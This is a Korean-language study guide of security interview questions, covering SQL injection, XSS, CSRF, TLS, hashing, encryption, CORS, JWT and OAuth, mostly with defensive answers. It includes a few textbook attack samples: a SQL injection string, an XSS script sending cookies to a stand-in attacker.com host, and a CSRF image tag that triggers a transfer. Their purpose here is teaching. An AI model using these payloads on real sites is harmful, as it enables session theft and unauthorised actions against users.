# 보안 면접 질문 & 답변

## 사용 방법
1. 질문을 먼저 읽고 스스로 답변해보세요
2. 답변을 확인하고 부족한 부분을 학습하세요
3. ⭐ 표시는 빈출 질문입니다

---

## Q1. SQL Injection이란 무엇이며, 어떻게 방어하나요? ⭐⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변
SQL Injection은 **악의적인 SQL 코드를 삽입**하여 데이터베이스를 조작하는 공격입니다.

### 공격 예시

```sql
-- 취약한 코드
String query = "SELECT * FROM users WHERE id = '" + userId + "'";

-- 공격: userId = "' OR '1'='1"
SELECT * FROM users WHERE id = '' OR '1'='1'  -- 모든 사용자 반환!
```

### 방어 방법

**1. Prepared Statement (권장)**
```java
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE id = ?"
);
stmt.setString(1, userId);
```

**2. ORM 사용**
```java
// JPA - 자동 파라미터 바인딩
userRepository.findById(userId);
```

**3. 입력 검증**
- 화이트리스트 검증
- 특수문자 이스케이프

### 면접관이 주목하는 포인트
- Prepared Statement 원리 이해
- 실제 방어 경험

</details>

---

## Q2. XSS(Cross-Site Scripting)란? ⭐⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변
XSS는 **악의적인 스크립트를 웹 페이지에 삽입**하여 사용자 정보를 탈취하는 공격입니다.

### XSS 유형

| 유형 | 설명 |
|------|------|
| Stored XSS | DB에 저장된 스크립트 실행 |
| Reflected XSS | URL 파라미터의 스크립트 반사 |
| DOM-based XSS | 클라이언트 JS로 DOM 조작 |

### 공격 예시

```html
<!-- 사용자 입력 -->
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

### 방어 방법

**1. 출력 이스케이프**
```javascript
// HTML 이스케이프
function escapeHtml(str) {
    return str.replace(/[&<>"']/g, char => ({
        '&': '&amp;', '<': '&lt;', '>': '&gt;',
        '"': '&quot;', "'": '&#39;'
    }[char]));
}
```

**2. CSP (Content Security Policy)**
```http
Content-Security-Policy: script-src 'self'
```

**3. HttpOnly 쿠키**
```http
Set-Cookie: session=abc123; HttpOnly
```

</details>

---

## Q3. HTTPS와 TLS는 무엇인가요? ⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변
HTTPS는 HTTP + TLS로, **통신을 암호화**하여 도청과 변조를 방지합니다.

### TLS 핸드셰이크 (간략)

```
1. Client Hello: 지원 암호화 스위트 전송
2. Server Hello: 암호화 방식 선택, 인증서 전송
3. 클라이언트: 인증서 검증, 세션 키 생성
4. 양방향 암호화 통신 시작
```

### 대칭키 vs 비대칭키

| 구분 | 대칭키 | 비대칭키 |
|------|--------|---------|
| 키 | 하나 (공유) | 공개키 + 개인키 |
| 속도 | 빠름 | 느림 |
| 용도 | 데이터 암호화 | 키 교환, 서명 |

### HTTPS 이점
- 기밀성 (도청 방지)
- 무결성 (변조 감지)
- 인증 (서버 신원 확인)

</details>

---

## Q4. 암호화 vs 해싱의 차이는? ⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변

| 구분 | 암호화 | 해싱 |
|------|--------|------|
| 가역성 | 복호화 가능 | 불가능 (단방향) |
| 목적 | 기밀성 | 무결성 검증 |
| 용도 | 데이터 보호 | 비밀번호 저장 |

### 비밀번호 저장

```python
# 나쁜 예: 평문 저장
password = "mypassword"

# 나쁜 예: 단순 해시
hash = sha256(password)

# 좋은 예: Salt + 느린 해시 (bcrypt)
hash = bcrypt.hashpw(password, bcrypt.gensalt())
```

### 해싱 알고리즘

| 알고리즘 | 용도 |
|---------|------|
| bcrypt, scrypt, Argon2 | 비밀번호 (느림, 권장) |
| SHA-256 | 파일 무결성 검증 |
| MD5 | 비권장 (취약) |

</details>

---

## Q5. CORS란 무엇인가요? ⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변
CORS(Cross-Origin Resource Sharing)는 **다른 출처의 리소스 접근을 제어**하는 브라우저 보안 정책입니다.

### Same-Origin Policy

```
같은 출처: 프로토콜 + 호스트 + 포트가 동일

https://example.com:443/page
  │         │        │
프로토콜   호스트    포트

https://api.example.com → 다른 출처 (호스트 다름)
```

### CORS 헤더

```http
# 서버 응답
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
Access-Control-Allow-Credentials: true
```

### Preflight 요청

```
복잡한 요청 전에 OPTIONS 요청으로 허용 여부 확인

1. 브라우저: OPTIONS /api/data
2. 서버: CORS 헤더로 응답
3. 허용되면 실제 요청 전송
```

</details>

---

## Q6. CSRF(Cross-Site Request Forgery) 공격이란? ⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변
CSRF는 인증된 사용자를 이용해 **의도하지 않은 요청을 서버에 전송**하게 하는 공격입니다.

### 공격 시나리오
```
1. 사용자가 은행 사이트에 로그인 (쿠키 발급)
2. 공격자가 만든 악성 페이지 방문
3. 악성 페이지에서 은행에 송금 요청
   <img src="https://bank.com/transfer?to=attacker&amount=1000000">
4. 브라우저가 자동으로 쿠키 포함하여 요청
5. 은행 서버는 정상 요청으로 처리
```

### 방어 방법

**1. CSRF Token**
```html
<!-- 서버에서 발급한 토큰을 폼에 포함 -->
<form action="/transfer" method="POST">
    <input type="hidden" name="_csrf" value="abc123xyz">
    <button>송금</button>
</form>
```

**2. SameSite Cookie**
```http
Set-Cookie: session=abc; SameSite=Strict
```
- Strict: 다른 사이트에서 쿠키 전송 X
- Lax: GET만 허용
- None: 항상 전송 (HTTPS 필수)

**3. Referer/Origin 검증**
```java
String origin = request.getHeader("Origin");
if (!allowedOrigins.contains(origin)) {
    throw new SecurityException("Invalid origin");
}
```

### CSRF vs XSS

| 구분 | CSRF | XSS |
|------|------|-----|
| 공격 대상 | 서버 | 사용자 |
| 이용 대상 | 사용자 인증 정보 | 브라우저 |
| 목적 | 의도하지 않은 요청 | 스크립트 실행 |

### 면접관이 주목하는 포인트
- CSRF Token 동작 원리
- SameSite 쿠키 설정

</details>

---

## Q7. 해시 함수의 특징을 설명해주세요. ⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변
해시 함수는 임의 길이의 데이터를 **고정 길이의 해시값**으로 변환하는 함수입니다.

### 해시 함수의 특성

| 특성 | 설명 |
|------|------|
| 결정성 | 같은 입력 → 항상 같은 출력 |
| 단방향성 | 해시값 → 원본 복원 불가 |
| 충돌 저항성 | 같은 해시를 만드는 두 입력 찾기 어려움 |
| 눈사태 효과 | 입력 조금만 바뀌어도 결과 완전히 다름 |

### 해시 알고리즘 비교

| 알고리즘 | 출력 크기 | 보안성 | 용도 |
|---------|----------|--------|------|
| MD5 | 128bit | 취약 | 비권장 |
| SHA-1 | 160bit | 취약 | 비권장 |
| SHA-256 | 256bit | 안전 | 파일 검증 |
| bcrypt | 가변 | 안전 | 비밀번호 |

### 사용 사례
- **비밀번호 저장**: bcrypt, argon2
- **파일 무결성 검증**: SHA-256
- **데이터 구조**: HashMap

### 비밀번호 저장 모범 사례
```java
// 나쁜 예
String hash = sha256(password);  // 레인보우 테이블 공격 가능

// 좋은 예
String hash = BCrypt.hashpw(password, BCrypt.gensalt());
// Salt + 느린 해시 = 안전
```

### 면접관이 주목하는 포인트
- Salt의 역할
- 왜 bcrypt가 권장되는지 (느린 연산)

</details>

---

## Q8. 대칭키와 비대칭키 암호화의 차이는? ⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변

| 구분 | 대칭키 | 비대칭키 |
|------|--------|---------|
| 키 개수 | 1개 (공유) | 2개 (공개키, 개인키) |
| 속도 | 빠름 | 느림 |
| 키 교환 | 어려움 | 쉬움 |
| 예시 | AES, DES | RSA, ECDSA |
| 용도 | 데이터 암호화 | 키 교환, 서명 |

### 대칭키 암호화
```
송신자          수신자
  │               │
  │──── 암호화 ───►│ (같은 키 사용)
  │     데이터      │
  │◄─── 복호화 ────│
```
- 장점: 빠름
- 단점: 키 공유 문제

### 비대칭키 암호화
```
송신자                 수신자
  │                     │
  │◄── 공개키 전달 ─────│
  │                     │
  │── 공개키로 암호화 ──►│
  │                     │
  │     개인키로 복호화   │
```
- 공개키: 암호화용 (공개)
- 개인키: 복호화용 (비밀)

### HTTPS에서의 활용
```
1. 서버가 공개키 전송
2. 클라이언트가 대칭키 생성
3. 공개키로 대칭키 암호화하여 전송
4. 이후 대칭키로 통신 (빠름)
```

### 면접관이 주목하는 포인트
- 왜 둘을 함께 사용하는지 (하이브리드)
- RSA의 원리 (소인수분해 어려움)

</details>

---

## Q9. 암호화 알고리즘의 종류를 설명해주세요. ⭐

<details>
<summary>답변 보기</summary>

### 대칭키 알고리즘

| 알고리즘 | 블록 크기 | 키 길이 | 상태 |
|---------|----------|---------|------|
| DES | 64bit | 56bit | 취약 |
| 3DES | 64bit | 168bit | 레거시 |
| AES | 128bit | 128/192/256bit | 권장 |

### 비대칭키 알고리즘

| 알고리즘 | 기반 | 용도 |
|---------|------|------|
| RSA | 소인수분해 | 암호화, 서명 |
| DSA | 이산 로그 | 서명 전용 |
| ECDSA | 타원 곡선 | 서명 (작은 키) |
| Diffie-Hellman | 이산 로그 | 키 교환 |

### AES 예시 (Java)
```java
// 암호화
Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);
byte[] encrypted = cipher.doFinal(plainText.getBytes());

// 복호화
cipher.init(Cipher.DECRYPT_MODE, secretKey, ivSpec);
byte[] decrypted = cipher.doFinal(encrypted);
```

### 선택 가이드
- **데이터 암호화**: AES-256-GCM
- **비밀번호 저장**: bcrypt, Argon2
- **디지털 서명**: ECDSA, RSA
- **키 교환**: ECDH, RSA

### 면접관이 주목하는 포인트
- AES의 모드 (ECB, CBC, GCM)
- IV(Initialization Vector)의 역할

</details>

---

## Q10. JWT(JSON Web Token)란 무엇인가요? ⭐⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변
JWT는 **JSON 형식의 자가 포함(Self-contained) 토큰**으로, 당사자 간 정보를 안전하게 전송하기 위한 표준(RFC 7519)입니다.

### JWT 구조

```
xxxxx.yyyyy.zzzzz
  │      │     │
Header.Payload.Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.    ← Header (Base64)
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik...  ← Payload (Base64)
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c ← Signature
```

### 각 부분의 역할

| 부분 | 내용 | 예시 |
|------|------|------|
| Header | 토큰 타입, 서명 알고리즘 | `{"alg": "HS256", "typ": "JWT"}` |
| Payload | 클레임(사용자 정보) | `{"sub": "1234", "name": "John"}` |
| Signature | 위변조 검증용 서명 | HMAC-SHA256(header + payload, secret) |

### JWT 인증 흐름

```
1. 로그인 → 서버가 JWT 발급
2. 클라이언트가 토큰 저장 (localStorage, Cookie)
3. 요청마다 Authorization: Bearer {token} 헤더로 전송
4. 서버가 서명 검증 후 요청 처리
```

### JWT 장점

```
✓ 무상태(Stateless): 서버에 세션 저장 불필요
✓ 확장성: 여러 서버에서 검증 가능
✓ 자가 포함: 필요한 정보를 토큰에 포함
```

### JWT 단점 및 주의점

```
✗ 토큰 크기가 세션 ID보다 큼
✗ 발급 후 취소(Revoke) 어려움
✗ Payload는 암호화가 아닌 인코딩 → 민감정보 저장 금지!
```

### Access Token vs Refresh Token

| 구분 | Access Token | Refresh Token |
|------|--------------|---------------|
| 목적 | API 인증 | Access Token 재발급 |
| 유효기간 | 짧음 (15분~1시간) | 긺 (1주~1달) |
| 저장 | 메모리/localStorage | HttpOnly Cookie |

### 면접관이 주목하는 포인트
- JWT가 무상태인 이유
- 토큰 탈취 시 대응 방안 (짧은 만료시간 + Refresh Token)

### 꼬리 질문 대비
- "JWT를 어디에 저장해야 하나요?"
  → XSS 취약: localStorage / CSRF 취약: Cookie → HttpOnly + SameSite Cookie 권장

</details>

---

## Q11. OAuth 인증 방식을 설명해주세요. ⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변
OAuth는 **제3자 애플리케이션이 사용자의 리소스에 접근할 수 있도록 권한을 위임**하는 개방형 표준 프로토콜입니다.

### OAuth 2.0 역할

| 역할 | 설명 | 예시 |
|------|------|------|
| Resource Owner | 리소스 소유자(사용자) | 일반 사용자 |
| Client | 리소스 접근 애플리케이션 | 우리 서비스 |
| Authorization Server | 인증/권한 부여 서버 | Google OAuth |
| Resource Server | 보호된 리소스 서버 | Google API |

### Authorization Code Grant 흐름 (가장 일반적)

```
┌──────────┐                              ┌───────────────┐
│  사용자   │                              │  Authorization │
│ (브라우저)│                              │    Server      │
└────┬─────┘                              └───────┬───────┘
     │  1. 로그인 버튼 클릭                        │
     │───────────────────────────────────────────►│
     │                                            │
     │  2. 로그인 페이지 (Google)                  │
     │◄───────────────────────────────────────────│
     │                                            │
     │  3. 로그인 + 권한 동의                      │
     │───────────────────────────────────────────►│
     │                                            │
     │  4. Authorization Code + redirect          │
     │◄───────────────────────────────────────────│
     │                                            │
┌────▼─────┐                              ┌───────┴───────┐
│  Client  │  5. Code → Access Token 교환  │               │
│  Server  │──────────────────────────────►│               │
│          │◄──────────────────────────────│               │
│          │  6. Access Token 발급         │               │
└──────────┘                              └───────────────┘
```

### OAuth Grant Types

| Grant Type | 용도 | 보안 수준 |
|------------|------|----------|
| Authorization Code | 서버 사이드 앱 | 높음 |
| Authorization Code + PKCE | SPA, 모바일 앱 | 높음 |
| Client Credentials | 서버 간 통신 | - |
| ~~Implicit~~ | SPA (비권장) | 낮음 |
| ~~Password~~ | 레거시 (비권장) | 낮음 |

### 주요 용어

```
- Scope: 요청하는 권한 범위 (email, profile 등)
- Consent: 사용자 권한 동의 화면
- State: CSRF 방지용 랜덤 값
- PKCE: Authorization Code 탈취 방지 (SPA/모바일)
```

### 소셜 로그인 구현 예시 (Spring Security)

```java
// application.yml
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id: ${GOOGLE_CLIENT_ID}
            client-secret: ${GOOGLE_CLIENT_SECRET}
            scope: email, profile
```

### 면접관이 주목하는 포인트
- Authorization Code 방식의 동작 원리
- OAuth와 인증(Authentication)의 차이 (OAuth는 인가 프로토콜)

### 꼬리 질문 대비
- "OAuth만으로 로그인을 구현할 수 있나요?"
  → OAuth는 인가(Authorization) 프로토콜. 인증을 위해서는 OpenID Connect(OIDC)를 함께 사용

</details>

---

## Q12. JWT와 OAuth의 차이점은? ⭐⭐

<details>
<summary>답변 보기</summary>

### 핵심 답변
JWT는 **토큰 형식(Format)**이고, OAuth는 **권한 위임 프로토콜(Protocol)**입니다. 서로 다른 개념이며, OAuth에서 JWT를 토큰 형식으로 사용할 수 있습니다.

### 개념적 차이

| 구분 | JWT | OAuth |
|------|-----|-------|
| 정의 | 토큰 형식/표준 | 권한 위임 프로토콜 |
| 역할 | 정보를 담는 "그릇" | 권한 부여 "절차" |
| 목적 | 정보의 안전한 전송 | 제3자 리소스 접근 권한 |
| 단독 사용 | 가능 (자체 인증) | 불가 (토큰 형식 필요) |

### 비유로 이해하기

```
JWT = 신분증 (형식)
OAuth = 신분증 발급 절차 (프로토콜)

→ OAuth 프로토콜로 JWT 형식의 토큰을 발급받을 수 있음
```

### 관계

```
┌─────────────────────────────────────┐
│           OAuth 2.0                 │
│   (권한 위임 프로토콜/프레임워크)       │
│                                     │
│  ┌─────────────┐  ┌─────────────┐  │
│  │  JWT 토큰   │  │ Opaque 토큰  │  │
│  │  (형식 A)   │  │  (형식 B)    │  │
│  └─────────────┘  └─────────────┘  │
│                                     │
└─────────────────────────────────────┘
```

### 사용 시나리오 비교

| 시나리오 | 선택 |
|---------|------|
| 자체 회원가입/로그인 | JWT 단독 사용 가능 |
| 소셜 로그인 (Google, Kakao) | OAuth + JWT |
| MSA 서비스 간 통신 | JWT |
| 제3자 API 권한 (타 서비스 데이터 접근) | OAuth |

### JWT 단독 인증 vs OAuth 인증

**JWT 단독 (자체 서비스)**
```
1. 사용자 → 우리 서버: 로그인 요청
2. 우리 서버: 비밀번호 검증 후 JWT 발급
3. 사용자: JWT로 API 요청
```

**OAuth + JWT (소셜 로그인)**
```
1. 사용자 → Google: 로그인
2. Google → 우리 서버: Authorization Code
3. 우리 서버 → Google: Code → Access Token 교환
4. 우리 서버: 사용자 정보 확인 후 자체 JWT 발급
5. 사용자: 우리 JWT로 API 요청
```

### 면접관이 주목하는 포인트
- JWT와 OAuth가 다른 레벨의 개념임을 이해
- 실제 서비스에서 어떻게 조합하여 사용하는지

### 꼬리 질문 대비
- "왜 소셜 로그인에서 Google의 Access Token을 직접 사용하지 않나요?"
  → Google 토큰은 Google API 호출용. 우리 서비스 인증에는 자체 JWT를 발급하여 사용

</details>

---

## 학습 체크리스트

- [ ] SQL Injection 방어 방법 알기
- [ ] XSS 유형과 방어 방법 설명 가능
- [ ] HTTPS/TLS 동작 원리 이해
- [ ] 암호화와 해싱 차이 설명 가능
- [ ] CORS 동작 원리 이해
- [ ] CSRF 공격과 방어 방법 이해
- [ ] 해시 함수 특성 설명 가능
- [ ] 대칭키/비대칭키 암호화 차이 설명 가능
- [ ] 주요 암호화 알고리즘 종류 알기
- [ ] JWT 구조와 인증 흐름 설명 가능
- [ ] OAuth 인증 방식 이해
- [ ] JWT와 OAuth의 차이점 설명 가능
